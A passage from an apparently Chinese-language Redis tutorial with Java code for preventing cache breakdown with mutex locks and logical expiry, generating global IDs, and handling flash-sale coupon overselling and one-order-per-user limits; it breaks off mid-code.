假设现在线程1过来访问，他查询缓存没有命中，但是此时他获得到了锁的资源，那么线程1就会一个人去执行逻辑，假设现在线程2过来，线程2在执行过程中，并没有获得到锁，那么线程2就可以进行到休眠，直到线程1把锁释放后，线程2获得到锁，然后再来执行逻辑，此时就能够从缓存中拿到数据了。 | 把过期时间设置在redis的value中，这个过期时间并不会直接作用于redis，而是后续通过逻辑去处理。假设线程1去查询缓存，然后从value中判断出来当前的数据已经过期，此时线程1去获得互斥锁，那么其他线程会进行阻塞，获得了锁的线程会开启一个 线程去进行以前的重构数据的逻辑，直到新开的线程完成这个逻辑后，才释放锁， 而线程1直接进行返回，假设现在线程3过来访问，由于线程线程2持有着锁，所以线程3无法获得锁，线程3也直接返回数据，只有等到新开的线程2把重建数据构建完后，其他线程才能走返回正确的数据。 |\n\n![](https://img.jwt1399.top/img/202211021615745.png)\n\n### 2.具体实现\n\n#### **互斥锁实现**\n\n核心思路：相较于原来从缓存中查询不到数据后直接查询数据库而言，现在的方案是进行查询之后，如果从缓存没有查询到数据，则进行互斥锁的获取，获取互斥锁后，判断是否得到了锁，如果没有得到，则休眠，过一会再进行尝试，直到获取到锁为止，才能进行查询，查询后将数据写入redis，再释放锁，返回数据，利用互斥锁就能保证只有一个线程去执行操作数据库的逻辑，防止缓存击穿。\n\n<img src=\"https://img.jwt1399.top/img/202211201526307.png\" style=\"zoom:50%;\" />\n\n**操作锁的代码：**\n\n思路：利用redis的`setnx`方法来表示获取锁，该方法含义是redis中：\n\n- 如果没有这个key，则插入成功，返回1，在stringRedisTemplate中返回true \n\n- 如果有这个key，则插入失败，返回0，在stringRedisTemplate返回false\n\n通过true或false，来表示是否有线程成功插入key，成功插入key的线程就是得到锁的线程。\n\n```java\nprivate boolean tryLock(String key) {\n    Boolean flag = stringRedisTemplate.opsForValue().setIfAbsent(key, \"1\", 10, TimeUnit.SECONDS);\n    return BooleanUtil.isTrue(flag);\n}\n\nprivate void unlock(String key) {\n    stringRedisTemplate.delete(key);\n}\n```\n\n**互斥锁防止缓存击穿代码：**\n\n```java\n public Shop queryWithMutex(Long id)  {\n        String key = CACHE_SHOP_KEY + id;\n        // 1、从redis中查询商铺缓存\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2、判断是否存在\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 存在,直接返回\n            return JSONUtil.toBean(shopJson, Shop.class);\n        }\n        //判断命中的值是否是空值\n        if (shopJson != null) {\n            //返回一个错误信息\n            return null;\n        }\n        // 4.实现缓存重构\n        //4.1 获取互斥锁\n        String lockKey = \"lock:shop:\" + id;\n        Shop shop = null;\n        try {\n            boolean isLock = tryLock(lockKey);\n            // 4.2 判断否获取成功\n            if(!isLock){\n                //4.3 失败，则休眠重试\n                Thread.sleep(50);\n                return queryWithMutex(id);\n            }\n            //4.4 成功，根据id查询数据库\n             shop = getById(id);\n            // 5.不存在，返回错误\n            if(shop == null){\n                 //将空值写入redis\nstringRedisTemplate.opsForValue().set(key,\"\",CACHE_NULL_TTL,TimeUnit.MINUTES);\n                //返回错误信息\n                return null;\n            }\n            //6.写入redis\n            stringRedisTemplate.opsForValue().set(key,JSONUtil.toJsonStr(shop),CACHE_SHOP_TTL,TimeUnit.MINUTES);\n\n        }catch (Exception e){\n            throw new RuntimeException(e);\n        }\n        finally {\n            //7.释放互斥锁\n            unlock(lockKey);\n        }\n        return shop;\n    }\n```\n\n**调用代码**\n\n```java\n    @Override\n    public Result queryById(Long id) {\n        // 缓存穿透\n        //Shop shop = queryWithPassThrough(id);\n\n         // 互斥锁解决缓存击穿\n        Shop shop = queryWithMutex(id);\n        if(shop == null){\n            return Result.fail(\"店铺不存在!!!\");\n        }\n        return Result.ok(shop);\n    }\n\n```\n\n分析：假设现在有1000个请求同时访问id=1的数据，并且该数据已经失效，这1000个请求都会成功。\n\n#### **逻辑过期实现**\n\n思路：当用户开始查询redis时，判断是否命中，如果没有命中则直接返回空数据，不查询数据库，而一旦命中后，将value取出，判断value中是否过期，如果没有过期，则直接返回redis中的数据；如果过期，则在开启独立线程后直接返回之前的数据，独立线程去重构数据，重构完成后释放互斥锁。\n\n<img src=\"https://img.jwt1399.top/img/202211201541199.png\" style=\"zoom:50%;\" />\n\n\n\n**步骤一：设置逻辑过期时间**\n\n因为现在redis中存储数据的value需带上逻辑过期时间\n\n- 1.此时要么去修改原来Shop实体类\n- 2.要么新建一个实体类\n\n我们采用第二个方案，对原来代码没有侵入性。\n\n```java\n@Data\npublic class RedisData {\n    private LocalDateTime expireTime;\n    private Object data;\n}\n```\n\n**步骤二：预热数据**\n\n```java\npublic void saveShop2Redis(Long id, Long expireSeconds) {\n  // 1.查询店铺数据\n  Shop shop = getById(id);\n  Thread.sleep(200);//模拟延迟\n  // 2.封装逻辑过期时间\n  RedisData redisData = new RedisData();\n  redisData.setData(shop);\n  redisData.setExpireTime(LocalDateTime.now().plusSeconds(expireSeconds));\n  //3.写入Redis\n  stringRedisTemplate.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(redisData));\n}\n```\n\n利用单元测试进行缓存预热\n\n```java\n@Resource\nprivate ShopServiceImpl shopService;\n\n@Test\nvoid testSaveShop() {\n  shopService.saveShop2Redis(1L, 10L);\n}\n```\n\n**逻辑过期防止缓存击穿代码**\n\n```java\nprivate static final ExecutorService CACHE_REBUILD_EXECUTOR = Executors.newFixedThreadPool(10); // 线程池\npublic Shop queryWithLogicalExpire( Long id ) {\n    String key = CACHE_SHOP_KEY + id;\n    // 1.从redis查询商铺缓存\n    String json = stringRedisTemplate.opsForValue().get(key);\n    // 2.判断是否存在\n    if (StrUtil.isBlank(json)) {\n        // 3.不存在，直接返回\n        return null;\n    }\n    // 4.存在，需要先把json反序列化为对象\n    RedisData redisData = JSONUtil.toBean(json, RedisData.class);\n    Shop shop = JSONUtil.toBean((JSONObject) redisData.getData(), Shop.class);\n    LocalDateTime expireTime = redisData.getExpireTime();\n    // 5.判断是否过期\n    if(expireTime.isAfter(LocalDateTime.now())) {\n        // 5.1.未过期，直接返回店铺信息\n        return shop;\n    }\n    // 5.2.已过期，需要缓存重建\n    // 5.2.1.获取互斥锁\n    String lockKey = LOCK_SHOP_KEY + id;\n    boolean isLock = tryLock(lockKey);\n    // 5.2.2.判断是否获取锁成功\n    if (isLock){\n        CACHE_REBUILD_EXECUTOR.submit( ()->{\n            try{\n                //5.2.3.重建缓存\n                saveShop2Redis(id, 20L);//实际中应设置成30分钟，这里是为了测试\n            }catch (Exception e){\n                throw new RuntimeException(e);\n            }finally {\n                unlock(lockKey);\n            }\n        });\n    }\n    // 5.2.4.返回过期的商铺信息\n    return shop;\n}\n```\n\n 注意：获取锁成功应该再次检测redis缓存是否过期，做DoubleCheck。如果存在则无需重建缓存。\n\n分析：假设现在有100个请求同时访问id=1的数据，并且该数据在数据库中已经被修改，但是Redis中没有被修改，这100个请求都会成功，只是前面的请求都是Redis中没修改的脏数据，后面的请求是Redis重建后的数据。\n\n也就是说请求来了先把Redis中逻辑过期的数据先返回给用户，等某个请求拿到锁之后重建缓存（访问一次数据库），之后就返回重建的新数据\n\n## ❼封装Redis工具类\n\n基于StringRedisTemplate封装一个缓存工具类CacheClient\n\n满足下列需求：\n\n* 方法1：将任意Java对象序列化为json并存储在string类型的key中，并且可以设置TTL过期时间\n* 方法2：将任意Java对象序列化为json并存储在string类型的key中，并且可以设置逻辑过期时间\n* 方法3：根据指定的key查询缓存，并反序列化为指定类型，利用缓存空值的方式解决缓存穿透问题\n* 方法4：根据指定的key查询缓存，并反序列化为指定类型，需要利用逻辑过期解决缓存击穿问题\n* 方法5：根据指定的key查询缓存，并反序列化为指定类型，需要利用互斥锁解决缓存击穿问题\n\n```java\n@Slf4j\n@Component\npublic class CacheClient {\n\n    private final StringRedisTemplate stringRedisTemplate;\n\n    public CacheClient(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n    \n    private boolean tryLock(String key) {\n      Boolean flag = stringRedisTemplate.opsForValue().setIfAbsent(key, \"1\", 10, TimeUnit.SECONDS);\n      return BooleanUtil.isTrue(flag);\n    }\n\n    private void unlock(String key) {\n      stringRedisTemplate.delete(key);\n    }\n\n    // 方法1：set()\n    // 方法2：setWithLogicalExpire()\n    // 方法3：queryWithPassThrough()\n    // 方法4：queryWithLogicalExpire()\n    // 方法5：queryWithMutex()\n  \n}\n```\n\n* 方法1：将任意Java对象序列化为json并存储在string类型的key中，并且可以设置TTL过期时间\n\n```java\npublic void set(String key, Object value, Long time, TimeUnit unit) {\n  stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(value), time, unit);\n}\n```\n\n* 方法2：将任意Java对象序列化为json并存储在string类型的key中，并且可以设置逻辑过期时间\n\n```java\npublic void setWithLogicalExpire(String key, Object value, Long time, TimeUnit unit) {\n  // 设置逻辑过期\n  RedisData redisData = new RedisData();\n  redisData.setData(value);\n  redisData.setExpireTime(LocalDateTime.now().plusSeconds(unit.toSeconds(time)));\n  // 写入Redis\n  stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(redisData));\n}\n```\n\n* 方法3：根据指定的key查询缓存，并反序列化为指定类型，利用缓存空值的方式解决缓存穿透问题\n\n```java\n public <R,ID> R queryWithPassThrough(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit){\n        String key = keyPrefix + id;\n        // 1.从redis查询商铺缓存\n        String json = stringRedisTemplate.opsForValue().get(key);\n        // 2.判断是否存在\n        if (StrUtil.isNotBlank(json)) {\n            // 3.存在，直接返回\n            return JSONUtil.toBean(json, type);\n        }\n        // 判断命中的是否是空值\n        if (json != null) {\n            // 返回一个错误信息\n            return null;\n        }\n        // 4.不存在，根据id查询数据库\n        R r = dbFallback.apply(id);\n        // 5.不存在，返回错误\n        if (r == null) {\n            // 将空值写入redis\n            stringRedisTemplate.opsForValue().set(key, \"\", CACHE_NULL_TTL, TimeUnit.MINUTES);\n            // 返回错误信息\n            return null;\n        }\n        // 6.存在，写入redis\n        this.set(key, r, time, unit);\n        return r;\n}\n```\n\n* 方法4：根据指定的key查询缓存，并反序列化为指定类型，需要利用逻辑过期解决缓存击穿问题\n\n```java\nprivate static final ExecutorService CACHE_REBUILD_EXECUTOR = Executors.newFixedThreadPool(10);\n\npublic <R, ID> R queryWithLogicalExpire(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {\n        String key = keyPrefix + id;\n        // 1.从redis查询商铺缓存\n        String json = stringRedisTemplate.opsForValue().get(key);\n        // 2.判断是否存在\n        if (StrUtil.isBlank(json)) {\n            // 3.存在，直接返回\n            return null;\n        }\n        // 4.命中，需要先把json反序列化为对象\n        RedisData redisData = JSONUtil.toBean(json, RedisData.class);\n        R r = JSONUtil.toBean((JSONObject) redisData.getData(), type);\n        LocalDateTime expireTime = redisData.getExpireTime();\n        // 5.判断是否过期\n        if(expireTime.isAfter(LocalDateTime.now())) {\n            // 5.1.未过期，直接返回店铺信息\n            return r;\n        }\n        // 5.2.已过期，需要缓存重建\n        // 6.缓存重建\n        // 6.1.获取互斥锁\n        String lockKey = LOCK_SHOP_KEY + id;\n        boolean isLock = tryLock(lockKey);\n        // 6.2.判断是否获取锁成功\n        if (isLock){\n            // 6.3.成功，开启独立线程，实现缓存重建\n            CACHE_REBUILD_EXECUTOR.submit(() -> {\n                try {\n                    // 查询数据库\n                    R newR = dbFallback.apply(id);\n                    // 重建缓存\n                    this.setWithLogicalExpire(key, newR, time, unit);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }finally {\n                    // 释放锁\n                    unlock(lockKey);\n                }\n            });\n        }\n        // 6.4.返回过期的商铺信息\n        return r;\n}\n```\n\n方法5：根据指定的key查询缓存，并反序列化为指定类型，需要利用互斥锁解决缓存击穿问题\n\n```java\n public <R, ID> R queryWithMutex(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {\n        String key = keyPrefix + id;\n        // 1.从redis查询商铺缓存\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2.判断是否存在\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 3.存在，直接返回\n            return JSONUtil.toBean(shopJson, type);\n        }\n        // 判断命中的是否是空值\n        if (shopJson != null) {\n            // 返回一个错误信息\n            return null;\n        }\n\n        // 4.实现缓存重建\n        // 4.1.获取互斥锁\n        String lockKey = LOCK_SHOP_KEY + id;\n        R r = null;\n        try {\n            boolean isLock = tryLock(lockKey);\n            // 4.2.判断是否获取成功\n            if (!isLock) {\n                // 4.3.获取锁失败，休眠并重试\n                Thread.sleep(50);\n                return queryWithMutex(keyPrefix, id, type, dbFallback, time, unit);\n            }\n            // 4.4.获取锁成功，根据id查询数据库\n            r = dbFallback.apply(id);\n            // 5.不存在，返回错误\n            if (r == null) {\n                // 将空值写入redis\n                stringRedisTemplate.opsForValue().set(key, \"\", CACHE_NULL_TTL, TimeUnit.MINUTES);\n                // 返回错误信息\n                return null;\n            }\n            // 6.存在，写入redis\n            this.set(key, r, time, unit);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }finally {\n            // 7.释放锁\n            unlock(lockKey);\n        }\n        // 8.返回\n        return r;\n}\n```\n\n- 在Service中调用方法\n\n```java\n@Resource\nprivate CacheClient cacheClient;\n\n    @Override\n    public Result queryById(Long id) {\n        // 解决缓存穿透\n        Shop shop = cacheClient\n                .queryWithPassThrough(CACHE_SHOP_KEY, id, Shop.class, this::getById, CACHE_SHOP_TTL, TimeUnit.MINUTES);\n\n        // 互斥锁解决缓存击穿\n        // Shop shop = cacheClient\n        //         .queryWithMutex(CACHE_SHOP_KEY, id, Shop.class, this::getById, CACHE_SHOP_TTL, TimeUnit.MINUTES);\n\n        // 逻辑过期解决缓存击穿\n        // Shop shop = cacheClient\n        //         .queryWithLogicalExpire(CACHE_SHOP_KEY, id, Shop.class, this::getById, 20L, TimeUnit.SECONDS);\n\n        if (shop == null) {\n            return Result.fail(\"店铺不存在！\");\n        }\n        // 7.返回\n        return Result.ok(shop);\n    }\n```\n\n# ③优惠券秒杀\n\n## ❶Redis实现全局唯一ID\n\n> 每个店铺都可以发布优惠券，当用户抢购时，就会生成订单并保存到tb_voucher_order这张表中，而订单表如果使用数据库自增ID就存在一些问题：\n>\n> * id的规律性太明显\n> * 受单表数据量的限制\n>\n> 场景分析一：如果我们的id具有太明显的规则，用户或者说商业对手很容易猜测出来我们的一些敏感信息，比如商城在一天时间内，卖出了多少单，这明显不合适。\n>\n> 场景分析二：随着我们商城规模越来越大，mysql的单表的容量不宜超过500W，数据量过大之后，我们要进行拆库拆表，但拆分表了之后，他们从逻辑上讲他们是同一张表，所以他们的id是不能一样的， 于是乎我们需要保证id的唯一性。\n\n**全局ID生成器**，是一种在分布式系统下用来生成全局唯一ID的工具，一般要满足下列特性：\n\n![](https://img.jwt1399.top/img/202211251852632.png)\n\n**全局唯一ID生成策略：UUID、Redis自增、snowflake算法、数据库自增**\n\n为了增加ID的安全性，我们可以不直接使用Redis自增的数值，而是拼接一些其它信息：\n\nRedis自增ID策略：ID构造是 时间戳 + 计数器，每天一个key，方便统计订单量\n\n![](https://img.jwt1399.top/img/202211251852180.png)\n\nID的组成部分：\n\n- 符号位：1bit，永远为0\n\n- 时间戳：31bit，以秒为单位\n\n- 序列号：32bit，秒内的计数器，支持每秒产生2^32个不同ID\n  - 表示在某一秒下，这个自增域最大可以分配的bit个数，在当前这种配置下，每一秒可以分配2^32个数据\n\n```java\n@Component\npublic class RedisIdWorker {\n    /**\n     * 开始时间戳（2022-01-01）\n     */\n    private static final long BEGIN_TIMESTAMP = 1640995200L;\n    /**\n     * 序列号的位数\n     */\n    private static final int COUNT_BITS = 32;\n\n    private StringRedisTemplate stringRedisTemplate;\n\n    public RedisIdWorker(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n    public long nextId(String keyPrefix) {\n        // 1.生成时间戳\n        LocalDateTime now = LocalDateTime.now();\n        long nowSecond = now.toEpochSecond(ZoneOffset.UTC);\n        long timestamp = nowSecond - BEGIN_TIMESTAMP; //现在时间-开始时间戳\n\n        // 2.生成序列号\n        // 2.1.获取当前日期，精确到天\n        String date = now.format(DateTimeFormatter.ofPattern(\"yyyy:MM:dd\"));\n        // 2.2.自增长\n        long count = stringRedisTemplate.opsForValue().increment(\"icr:\" + keyPrefix + \":\" + date);\n\n        // 3.拼接并返回\n        return timestamp << COUNT_BITS | count;\n    }\n}\n```\n\n**测试类**\n\n```java\n\t\t@Resource\n    private RedisIdWorker redisIdWorker;\n\n    private ExecutorService es = Executors.newFixedThreadPool(500);\n\n    @Test\n    void testIdWorker() throws InterruptedException {\n        CountDownLatch latch = new CountDownLatch(300);\n\n        Runnable task = () -> {\n            for (int i = 0; i < 100; i++) {\n                long id = redisIdWorker.nextId(\"order\");\n                System.out.println(\"id = \" + id);\n            }\n            latch.countDown();\n        };\n        long begin = System.currentTimeMillis();\n        for (int i = 0; i < 300; i++) {\n            es.submit(task);\n        }\n        latch.await();\n        long end = System.currentTimeMillis();\n        System.out.println(\"time = \" + (end - begin));\n    }\n```\n\n> 知识小贴士：countdownlatch\n>\n> countdownlatch名为信号枪：主要的作用是同步协调在多线程的等待于唤醒问题\n>\n> 如果没有CountDownLatch ，那么由于程序是异步的，当异步程序没有执行完时，主线程就已经执行完了，然后我们期望的是分线程全部走完之后，主线程再走，所以我们此时需要使用到CountDownLatch，CountDownLatch 中有两个最重要的方法\n>\n> - 1、countDown\n>\n> - 2、await\n>\n> await 方法是阻塞方法，我们担心分线程没有执行完时，main线程就先执行，所以使用await可以让main线程阻塞，那么什么时候main线程不再阻塞呢？当CountDownLatch 内部维护的变量变为0时，就不再阻塞，直接放行，那么什么时候CountDownLatch   维护的变量变为0 呢，我们只需要调用一次countDown ，内部变量就减少1，我们让分线程和变量绑定， 执行完一个分线程就减少一个变量，当分线程全部走完，CountDownLatch 维护的变量就是0，此时await就不再阻塞，统计出来的时间也就是所有分线程执行完后的时间。\n\n## ❷添加优惠卷\n\n每个店铺都可以发布优惠券，分为平价券和特价券。平价券可以任意购买，而特价券需要秒杀抢购：\n\n![](../images/Redis-实战篇/1653365145124.png)\n\n表信息：\n\n- tb_voucher：优惠券的基本信息，优惠金额、使用规则等\n- tb_seckill_voucher：优惠券的库存、开始抢购时间，结束抢购时间。特价优惠券才需要填写这些信息\n\n平价卷由于优惠力度并不是很大，所以是可以任意领取；而特价券由于优惠力度大，就得限制数量，从表结构上也能看出，特价卷除了具有优惠卷的基本信息以外，还具有库存，抢购时间，结束时间等等字段\n\n**新增普通卷代码：  **VoucherController\n\n```java\n@PostMapping\npublic Result addVoucher(@RequestBody Voucher voucher) {\n    voucherService.save(voucher);\n    return Result.ok(voucher.getId());\n}\n```\n\n**新增秒杀卷代码：**\n\n- **VoucherController**\n\n```java\n@PostMapping(\"seckill\")\npublic Result addSeckillVoucher(@RequestBody Voucher voucher) {\n    voucherService.addSeckillVoucher(voucher);\n    return Result.ok(voucher.getId());\n}\n```\n\n- **VoucherServiceImpl**\n\n```java\n@Override\n@Transactional\npublic void addSeckillVoucher(Voucher voucher) {\n    // 保存优惠券\n    save(voucher);\n    // 保存秒杀信息\n    SeckillVoucher seckillVoucher = new SeckillVoucher();\n    seckillVoucher.setVoucherId(voucher.getId());\n    seckillVoucher.setStock(voucher.getStock());\n    seckillVoucher.setBeginTime(voucher.getBeginTime());\n    seckillVoucher.setEndTime(voucher.getEndTime());\n    seckillVoucherService.save(seckillVoucher);\n    // 保存秒杀库存到Redis中\n    stringRedisTemplate.opsForValue().set(SECKILL_STOCK_KEY + voucher.getId(), voucher.getStock().toString());\n}\n```\n\n**添加一张特价券**\n\n![](https://img.jwt1399.top/img/202211252001419.png)\n\n```json\n{\n    \"shopId\": 1,\n    \"title\": \"100元特价劵\",\n    \"subTitle\": \"周一至周五均可使用\",\n    \"rules\": \"全场通用\\\\n无需预约\\\\n可无限叠加\\\\不兑现、不找零\\n仅限堂食\",\n    \"payValue\": 8000,\n    \"actualValue\": 10000,\n    \"type\": 1,\n    \"stock\": 100,\n    \"beginTime\": \"2022-11-25T18:10:39\",\n    \"endTime\": \"2022-11-25T24:32:19\"\n}\n```\n\n## ❸实现秒杀下单\n\n下单核心思路：当我们点击抢购时，会触发右侧的请求，我们只需要编写对应的controller即可\n\n![](https://img.jwt1399.top/img/202211252011573.png)\n\n秒杀下单应该思考的内容：\n\n* 秒杀是否开始或结束，如果尚未开始或已经结束则无法下单\n* 库存是否充足，不足则无法下单\n\n下单核心逻辑分析：\n\n当用户开始进行下单，我们应当去查询优惠卷信息，查询到优惠卷信息，判断是否满足秒杀条件，比如时间是否充足，如果时间充足，则进一步判断库存是否足够，如果两者都满足，则扣减库存，创建订单，然后返回订单id，如果有一个条件不满足则直接结束。\n\n![](https://img.jwt1399.top/img/202211252011684.png)\n\n```java\n// VoucherOrderServiceImpl\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    // 1.查询优惠券\n    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n    // 2.判断秒杀是否开始\n    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n        // 尚未开始\n        return Result.fail(\"秒杀尚未开始！\");\n    }\n    // 3.判断秒杀是否已经结束\n    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n        // 尚未开始\n        return Result.fail(\"秒杀已经结束！\");\n    }\n    // 4.判断库存是否充足\n    if (voucher.getStock() < 1) {\n        // 库存不足\n        return Result.fail(\"库存不足！\");\n    }\n    //5，扣减库存\n    boolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\")\n            .eq(\"voucher_id\", voucherId).update();\n    if (!success) {\n        //扣减库存\n        return Result.fail(\"库存不足！\");\n    }\n    //6.创建订单\n    VoucherOrder voucherOrder = new VoucherOrder();\n    // 6.1.订单id\n    long orderId = redisIdWorker.nextId(\"order\");\n    voucherOrder.setId(orderId);\n    // 6.2.用户id\n    Long userId = UserHolder.getUser().getId();\n    voucherOrder.setUserId(userId);\n    // 6.3.代金券id\n    voucherOrder.setVoucherId(voucherId);\n    save(voucherOrder);\n\n    return Result.ok(orderId);\n\n}\n```\n\n## ❹库存超卖问题分析\n\n有关超卖问题分析：原有代码中是这么写的\n\n```java\n if (voucher.getStock() < 1) {\n        // 库存不足\n        return Result.fail(\"库存不足！\");\n    }\n    //5，扣减库存\n    boolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\")\n            .eq(\"voucher_id\", voucherId).update();\n    if (!success) {\n        //扣减库存\n        return Result.fail(\"库存不足！\");\n    }\n```\n\n假设线程1过来查询库存，判断出来库存大于1，正准备去扣减库存，但是还没有来得及去扣减，此时线程2过来，线程2也去查询库存，发现这个数量一定也大于1，那么这两个线程都会去扣减库存，最终多个线程相当于一起去扣减库存，此时就会出现库存的超卖问题。\n\n------\n\n超卖问题是典型的多线程安全问题，针对这一问题的常见解决方案就是加锁，对于加锁，通常有两种解决方案：\n\n![](https://img.jwt1399.top/img/202211252100546.png)\n\n本项目我们采用乐观锁来解决超卖问题：\n\n> 乐观锁：会有一个版本号，每次操作数据会对版本号+1，再提交回数据时，会去校验是否比之前的版本大1 ，如果大1 ，则进行操作成功，这套机制的核心逻辑在于，如果在操作过程中，版本号只比原来大1 ，那么就意味着操作过程中没有人对他进行过修改，他的操作就是安全的，如果不大1，则数据被修改过。\n>\n> 乐观锁的典型代表：就是CAS，利用CAS进行无锁化机制加锁，var5 是操作前读取的内存值，while中的var1+var2 是预估值，如果预估值 == 内存值，则代表中间没有被人修改过，此时就将新值去替换 内存值\n>\n>   其中do while 是为了在操作失败时，再次进行自旋操作，即把之前的逻辑再操作一次。\n>\n> ```java\n> int var5;\n> do {\n>     var5 = this.getIntVolatile(var1, var2);\n> } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));\n> \n> return var5;\n> ```\n>\n\n项目中的使用方式是没有像CAS一样带自旋的操作，也没有对版本号+1 ，而是直接将stock做为版本号\n\n<img src=\"https://img.jwt1399.top/img/202211252116596.png\" style=\"zoom:50%;\" />\n\n## ❺乐观锁解决超卖问题\n\n**方案一**\n\nVoucherOrderServiceImpl 在扣减库存时，改为：\n\n```java\nboolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\") //set stock = stock -1\n            .eq(\"voucher_id\", voucherId).eq(\"stock\",voucher.getStock()).update(); //where id = ？ and stock = ?\n```\n\n代码分析：当扣减库存时的库存和之前我查询到的库存是一样的，就意味着没有人在中间修改过库存，那么此时就是安全的，但是以上这种方式通过测试发现会有很多失败的情况，失败的原因在于：在使用乐观锁过程中假设100个线程同时都拿到了100的库存，然后大家一起去进行扣减，但是100个人中只有1个人能扣减成功，其他的人在扣减时，发现库存已经被修改过了，所以此时这些线程都会失败。\n\n**方案二**\n\n方案一要求修改前后都保持一致，但是这样我们分析过，成功的概率太低，所以我们的乐观锁需要变一下，改成stock 大于 0 即可进行修改\n\n```java\nboolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\")\n            .eq(\"voucher_id\", voucherId).gt(\"stock\",0).update(); //where id = ? and stock > 0\n```\n\n##  ❻优惠券秒杀-一人一单\n\n> 需求：修改秒杀业务，要求同一个优惠券，一个用户只能下一单\n\n**现在的问题在于：**优惠卷是为了引流，但是目前的情况是，一个人可以无限制的抢这个优惠卷，所以我们应当增加一层逻辑，让一个用户只能下一个单，而不是让一个用户下多个单\n\n**具体操作逻辑：**首先判断优惠卷秒杀是否开始，如果开始，则进一步判断库存是否足够，然后再根据优惠卷id和用户id查询是否已经下过这个订单，如果下过这个订单，则不再下单，否则进行下单\n\n![](https://img.jwt1399.top/img/202211261532789.png)\n\n**初步代码：增加一人一单逻辑**\n\n```java\n//VoucherOrderServiceImpl  \n@Override\npublic Result seckillVoucher(Long voucherId) {\n    // 1.查询优惠券\n    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n    // 2.判断秒杀是否开始\n    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n        // 尚未开始\n        return Result.fail(\"秒杀尚未开始！\");\n    }\n    // 3.判断秒杀是否已经结束\n    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n        // 尚未开始\n        return Result.fail(\"秒杀已经结束！\");\n    }\n    // 4.判断库存是否充足\n    if (voucher.getStock() < 1) {\n        // 库存不足\n        return Result.fail(\"库存不足！\");\n    }\n    // 5.一人一单逻辑\n    // 5.1.用户id\n    Long userId = UserHolder.getUser().getId();\n    int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherId).count();\n    // 5.2.判断是否存在\n    if (count > 0) {\n        // 用户已经购买过了\n        return Result.fail(\"用户已经购买过一次！\");\n    }\n    //6，扣减库存\n  \tboolean success = seckillVoucherService.update()\n      .setSql(\"stock= stock -1\")\n      .eq(\"voucher_id\", voucherId).gt(\"stock\",0).update(); //where id = ? and stock > 0\n  \tif (!success) {\n    \treturn Result.fail(\"库存不足！\");\n  \t}\n    //7.创建订单\n    VoucherOrder voucherOrder = new VoucherOrder();\n    // 7.1.订单id\n    long orderId = redisIdWorker.nextId(\"order\");\n    voucherOrder.setId(orderId);\n\n    voucherOrder.setUserId(userId);\n    // 7.3.代金券id\n    voucherOrder.setVoucherId(voucherId);\n    save(voucherOrder);\n\n    return Result.ok(orderId);\n\n}\n```\n\n**存在问题：**现在的问题还是和之前一样，并发过来，查询数据库，都不存在订单，所以我们还是需要加锁，但是乐观锁比较适合更新数据，而现在是插入数据，所以我们需要使用悲观锁操作\n\n**注意：**在这里提到了非常多的问题，我们需要慢慢的来思考，首先将初始方案封装一个createVoucherOrder方法，同时为了确保他线程安全，在方法上添加了一把synchronized 锁\n\n```java\n@Transactional\npublic synchronized Result createVoucherOrder(Long voucherId) {\n\t\t\t\tLong userId = UserHolder.getUser().getId();\n          // 5.一人一单逻辑\n         // 5.1.查询订单\n        int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherId).count();\n        // 5.2.判断是否存在\n        if (count > 0) {\n            // 用户已经购买过了\n            return Result.fail(\"用户已经购买过一次！\");\n        }\n\n        // 6.扣减库存\n        boolean success = seckillVoucherService.update()\n                .setSql(\"stock = stock - 1\") // set stock = stock - 1\n                .eq(\"voucher_id\", voucherId).gt(\"stock\", 0) // where id = ? and stock > 0\n                .update();\n        if (!success) {\n            // 扣减失败\n            return Result.fail(\"库存不足！\");\n        }\n\n        // 7.创建订单\n        VoucherOrder voucherOrder = new VoucherOrder();\n        // 7.1.订单id\n        long orderId = redisIdWorker.nextId(\"order\");\n        voucherOrder.setId(orderId);\n        // 7.2.用户id\n        voucherOrder.setUserId(userId);\n        // 7.3.代金券id\n        voucherOrder.setVoucherId(voucherId);\n        save(voucherOrder);\n\n        // 7.返回订单id\n        return Result.ok(orderId);\n}\n```\n\n但是这样添加锁，锁的粒度太粗了，在使用锁过程中，控制**锁粒度** 是一个非常重要的事情，因为如果锁的粒度太大，会导致每个线程进来都会锁住，所以我们需要去控制锁的粒度。\n\n代码需要修改为：\nintern() 这个方法是从常量池中拿到数据，如果我们直接使用userId.toString() 拿到的对象实际上是不同的对象，new出来的对象，我们使用锁必须保证锁必须是同一把，所以我们需要使用intern()方法\n\n```java\n@Transactional\npublic  Result createVoucherOrder(Long voucherId) {\n\tLong userId = UserHolder.getUser().getId();\n\tsynchronized(userId.toString().intern()){\n         // 5.一人一单逻辑\n         // 5.1.查询订单\n        int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherId).count();\n        // 5.2.判断是否存在\n        if (count > 0) {\n            // 用户已经购买过了\n            return Result.fail(\"用户已经购买过一次！\");\n      